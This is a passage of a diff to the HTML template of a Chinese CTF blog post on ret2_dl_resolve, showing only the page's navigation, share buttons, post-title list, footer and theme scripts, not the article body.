             <span class="copy-path" data-clipboard-text="原文: https://binlep.github.io/old_blog_01/2020/01/11/【Pwn 笔记】简单记如何利用 ret2_dl_resolve/　　作者: binLep" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+
             <script> var clipboard = new Clipboard('.copy-path'); </script>
+
         </p>
+
         <p>
+
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+
         </p>
+
     </div>
+
+
+
+
 
 
 
     <nav id="article-nav">
+
         
+
             <div id="article-nav-newer" class="article-nav-title">
+
                 <a href="../../12/【WriteUp】RoarCTF 2019--Pwn题解/">
+
                     【WriteUp】RoarCTF 2019--Pwn题解
+
                 </a>
+
             </div>
+
         
+
         
+
             <div id="article-nav-older" class="article-nav-title">
+
                 <a href="../../04/【WriteUp】安恒杯元旦月赛--Pwn题解/">
+
                     【WriteUp】安恒杯元旦月赛--Pwn题解
+
                 </a>
+
             </div>
+
         
+
     </nav>
 
+
+
   
+
 </article>
 
+
+
     <div id="toc" class="toc-article">
+
         <strong class="toc-title">文章目录</strong>
+
         
+
             
+
         
+
     </div>
+
     <style>
+
         .left-col .switch-btn,
+
         .left-col .switch-area {
+
             display: none;
+
         }
+
         .toc-level-3 i,
+
         .toc-level-3 ol {
+
             display: none !important;
+
         }
+
     </style>
+
+
 
     <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
+
+
     <script>
+
         yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+
     </script>
 
 
 
-    
-<div class="share">
-    
-        <div class="bdsharebuttonbox">
-            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
-            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
-            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
-            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
-            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
-            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
-            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
-        </div>
-        <script>
-            window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"【Pwn 笔记】简单记如何利用 Ret2_dl_resolve　| binLep's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
-        </script>
-    
+
+
+
 
     
+
+<div class="share">
+
+    
+
+        <div class="bdsharebuttonbox">
+
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+
+        </div>
+
+        <script>
+
+            window._bd_share_config={
+
+                "common":{"bdSnsKey":{},"bdText":"【Pwn 笔记】简单记如何利用 Ret2_dl_resolve　| binLep's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+
+        </script>
+
+    
+
+
+
+    
+
 </div>
 
 
@@ -401,139 +796,282 @@
 
 
 
+
+
+
+
+
+
+
+
     
+
+
+
+
+
 
 
 
 
     <div class="scroll" id="post-nav-button">
+
         
+
             <a href="../../12/【WriteUp】RoarCTF 2019--Pwn题解/" title="上一篇: 【WriteUp】RoarCTF 2019--Pwn题解">
+
                 <i class="fa fa-angle-left"></i>
+
             </a>
+
         
+
+
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
+
+
         
+
             <a href="../../04/【WriteUp】安恒杯元旦月赛--Pwn题解/" title="下一篇: 【WriteUp】安恒杯元旦月赛--Pwn题解">
+
                 <i class="fa fa-angle-right"></i>
+
             </a>
+
         
+
     </div>
+
+
 
     <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="../../../04/29/【置顶】博客搬家啦/">【置顶】博客搬家啦</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/23/【WriteUp】NPUCTF 2020 -- Pwn 题解/">【WriteUp】NPUCTF 2020 -- Pwn 题解（未完）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/21/【WriteUp】UMDCTF  2020 -- Pwn 题解/">【WriteUp】UMDCTF  2020 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/15/【Pwn 笔记】IO FILE 利用链汇总/">【Pwn 笔记】IO FILE 利用链汇总（待补充）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/15/【Pwn 笔记】glibc 利用中那些偏门的技巧/">【Pwn 笔记】Glibc 利用中那些偏门的技巧</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/13/【WriteUp】Byte Bandits CTF 2020 -- Pwn 题解/">【WriteUp】Byte Bandits CTF 2020 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/12/【WriteUp】TG：HACK 2020 -- Pwn 题解/">【WriteUp】TG：HACK 2020 -- Pwn 题解（未完）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/30/【Blockchain 笔记】区块链的环境搭建/">【Blockchain 笔记】区块链的环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/26/【Pwn 笔记】Windows Pwn 环境搭建/">【Pwn 笔记】Windows Pwn 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/24/【Pwn 笔记】Linux 命令注入一览/">【Pwn 笔记】Linux 命令注入一览</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/24/【WrtieUp】BJDCTF 2nd -- Pwn 题解/">【WrtieUp】BJDCTF 2nd -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/21/【WrtieUp】CISCN 2019 -- Pwn 题解/">【WrtieUp】CISCN 2019 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/20/【Pwn 笔记】跨平台架构的环境配置与调试/">【Pwn 笔记】跨平台架构的环境配置与调试</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/12/【Pwn 笔记】Linux Kernel 调试命令总结/">【Pwn 笔记】Linux Kernel 调试命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/12/【Pwn 笔记】Linux Kernel 总结 -- ROP/">【Pwn 笔记】Linux Kernel 总结 -- Kernel-ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/12/【Pwn 笔记】Linux Kernel 调试文件总结/">【Pwn 笔记】Linux Kernel 调试文件总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/10/【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解/">【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/03/【Pwn 笔记】栈溢出利用总结 -- Advanced ROP/">【Pwn 笔记】栈溢出利用总结 -- Advanced ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/29/【Crypto 笔记】古典密码学习/">【Crypto 笔记】古典密码学习</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/28/【Web 笔记】md5 绕过总结/">【Web 笔记】Md5 绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/28/【Web 笔记】关于 SSTI 注入/">【Web 笔记】关于 SSTI 注入及绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/25/【杂项】磁盘阵列知识梳理/">【杂项】磁盘阵列知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/25/【SQL 笔记】绕过技术总结/">【SQL 笔记】绕过技术总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/18/【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户/">【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/16/【WriteUp】HGAME 2020--Pwn题解/">【WriteUp】HGAME 2020--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/15/【WriteUp】ACTF 2020 题解/">【WriteUp】ACTF 2020 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/02/【Misc 笔记】流量分析篇/">【Misc 笔记】流量分析篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../24/【Pwn 笔记】Android Kernel 环境搭建/">【Pwn 笔记】Android Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../13/【Pwn 笔记】Linux Kernel 环境搭建/">【Pwn 笔记】Linux Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../13/【WriteUp】SCTF 2019--Pwn题解/">【WriteUp】SCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../12/【WriteUp】RoarCTF 2019--Pwn题解/">【WriteUp】RoarCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="">【Pwn 笔记】简单记如何利用 Ret2_dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="../../04/【WriteUp】安恒杯元旦月赛--Pwn题解/">【WriteUp】安恒杯元旦月赛--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../03/【汇编学习】mips 寄存器/">【汇编学习】Mips 寄存器</a></li><li class="post-list-item"><a class="post-list-link" href="../../03/【汇编学习】mips 指令集/">【汇编学习】Mips 指令集</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/30/【WriteUp】kksctf open 2019--Pwn题解/">【WriteUp】#kksctf Open 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/25/【WriteUp】攻防世界--Pwn题解(Part 3)/">【WriteUp】攻防世界--Pwn题解(Part 3)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/25/【Pwn 笔记】函数中的宏常量定义/">【Pwn 笔记】函数中的宏常量定义</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/24/【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解/">【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/16/【Pwn 笔记】格式化字符串总结/">【Pwn 笔记】格式化字符串总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/">【WriteUp】攻防世界--Pwn题解(Part 2)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/18/【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解/">【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/05/【WriteUp】Hackme CTF--Pwn题解/">【WriteUp】Hackme CTF--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/11/03/【学习总结】Python沙箱逃逸/">【学习总结】Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【Docker】Docker使用教程/">【Docker】Docker使用教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【Docker】Docker安装教程/">【Docker】Docker安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/28/【WriteUp】RSCTF 2019 题解/">【WriteUp】RSCTF 2019 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/15/【Pwn 笔记】堆利用总结/">【Pwn 笔记】堆利用总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/14/【WriteUp】CryptixCTF'19 题解/">【WriteUp】CryptixCTF'19 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/05/【WriteUp】攻防世界--Pwn题解(Part 1)/">【WriteUp】攻防世界--Pwn题解(Part 1)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/03/【WriteUp】MOCTF--web题解/">【WriteUp】MOCTF--Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/10/02/【杂项】一些网站汇总/">【杂项】一些网站汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/28/【WriteUp】Newark Academy CTF 2019 题解/">【WriteUp】Newark Academy CTF 2019 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/24/【WriteUp】Jarvis OJ--Pwn题解/">【WriteUp】Jarvis OJ--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/19/【BugkuCTF】Pwn题解/">【BugkuCTF】Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/11/【杂项】C语言函数总结/">【杂项】C语言函数总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/10/【Pwn 笔记】堆利用总结--空闲块篇/">【Pwn 笔记】堆利用总结--空闲块篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Hexo】让Github Pages被索引到/">【Hexo】让Github Pages被索引到</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Hexo】更改Yelee主题内部文件为自己想要的样式/">【Hexo】更改Yelee主题内部文件为自己想要的样式</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/09/【Gem】gem安装教程/">【Gem】gem安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Web--j2x2j/">【TokyoWesterns CTF 5th 2019】Web--J2x2j</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Pwn--nothing more to say/">【TokyoWesterns CTF 5th 2019】Pwn--Nothing More to Say</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Crypto--real-baby-rsa/">【TokyoWesterns CTF 5th 2019】Crypto--Real-Baby-Rsa</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【杂项】本人的CTF writeup模板/">【杂项】本人的CTF Writeup模板</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【TokyoWesterns CTF 5th 2019】Misc--Welcome!!/">【TokyoWesterns CTF 5th 2019】Misc--Welcome!!</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【Hexo】安装hexo的一系列组件-Step1/">【Hexo】安装hexo的一系列组件--Step1</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/08/【Hexo】搭建博客时遇到的问题/">【Hexo】搭建博客时遇到的问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/07/【Npm】npm问题归总/">【Npm】npm问题汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/09/07/【Hexo】搭建GitHub博客--Step2/">【Hexo】搭建GitHub博客--Step2</a></li></ul>
 
 
 
 
+
+
+
+
+
     <script>
+
         
+
     </script>
+
 </div>
+
       <footer id="footer">
+
     <div class="outer">
+
         <div id="footer-info">
+
             <div class="footer-left">
+
                 <i class="fa fa-copyright"></i> 
+
                 2019-2020 binLep
+
             </div>
+
             <div class="footer-right">
+
                 <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+
             </div>
+
         </div>
+
         
+
             <div class="visit">
+
                 
+
                     <span id="busuanzi_container_site_pv" style='display:none'>
+
                         <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+
                         </span>
+
                     </span>
+
                 
+
                 
+
                     <span>| </span>
+
                 
+
                 
+
                     <span id="busuanzi_container_page_pv" style='display:none'>
+
                         <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+
                         </span>
+
                     </span>
+
                 
+
             </div>
+
         
+
     </div>
+
 </footer>
+
     </div>
+
     
+
     <script src="../../../../js/GithubRepoWidget.js"></script>
 
-<script data-main="/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+
+<script data-main="/old_blog_01/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+
 
     <script>
+
         $(document).ready(function() {
+
             var iPad = window.navigator.userAgent.indexOf('iPad');
+
             if (iPad > -1 || $(".left-col").css("display") === "none") {
+
                 var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+
                 var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+
                 $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+
             }
+
             else {
+
                 var backgroundnum = 5;
+
                 var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+
                 $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+
             }
+
         })
+
     </script>
+
+
+
+
+
+
 
 
 
 
 
 <div class="scroll" id="scroll">
+
     <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+
     <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+
     <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+
 </div>
+
 <script>
+
     // Open in New Window
+
     
+
         var oOpenInNew = {
+
              github: ".github-widget a", 
+
              title: "a.article-title, .article-more-link a", 
+
              post: ".article-entry a[href], .copyright a[href]", 
+
              tags: ".article-tag a", 
+
              categories: ".article-category a, a.tag-list-link", 
+
              articleNav: "#article-nav a, #post-nav-button a", 
+
              archives: ".archive-article-title", 
+
              miniArchives: "a.post-list-link", 
+
              menu: ".header-menu a", 
+
              friends: "#js-friends a", 
+
              socail: ".social a" 
+
         }
+
         for (var x in oOpenInNew) {
+
             $(oOpenInNew[x]).attr("target", "_blank");
+
         }
+
     
+
 </script>
 
+
+
     <script>
+
         var originTitle = document.title;
+
         var titleTime;
+
         document.addEventListener("visibilitychange", function() {
+
             if (document.hidden) {
+
                 document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+
                 clearTimeout(titleTime);
+
             }
+
             else {
+
                 document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+
                 titleTime = setTimeout(function() {
+
                     document.title = originTitle;
+
                 }, 2000);
+
             }
+
         })
+
     </script>
 
+
+
 <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
   </div>
+
 </body>
+
 </html>
